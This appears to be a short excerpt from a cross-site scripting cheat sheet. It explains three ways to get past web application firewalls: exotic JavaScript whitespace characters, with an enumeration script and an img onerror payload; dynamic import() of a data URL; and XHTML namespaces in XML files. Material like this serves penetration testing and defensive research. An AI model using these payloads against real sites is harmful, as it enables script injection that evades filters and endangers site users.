  md: "# # Whitespace\n\nThere are many whitespace characters in JavaScript and using\
    \ them can help bypass dumb WAF that is using regular expressions to look for\
    \ certain keywords like. Here's a simple way to test for whitespace (note this\
    \ will include new lines, carriage return and line/paragraph separators):\n\n\
    ```\nlog=[];\nfunction funct(){\n  for(let i=0;i<=0x10ffff;i++){\n    try{\n \
    \     eval(`func${String.fromCodePoint(i)}`);\n      log.push(i);\n    } catch(e){}\n\
    \  }\n}\nconsole.log(log);\n// 9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8\\\
    \n232,8233,8239,8287,12288,65279\n```\n\nEither the raw characters can be used\
    \ or you HTML encode them if they appear in SVG or HTML attributes:\n\n```\n<img/src/onerror=alert&#65279;(1)>\n\
    ```\n\n# # Dynamic imports\n\nJavascript allows you to dynamically load a module\
    \ using import() it's like a regular function except it allows the JavaScript\
    \ engine to choose if it's actually needed. This function-expression allows you\
    \ to specify URLs to load and quite easily allows you to specify a data URL to\
    \ execute arbitrary JavaScript:\n\n```\nimport('data:text/javascript,alert(1)')\n\
    ```\n\n# # XHTML namespace in XML\n\nIf you have control over an XML file with\
    \ a content type of text/xml it's still possible to execute JavaScript if you\
    \ provide an XHTML namespace."
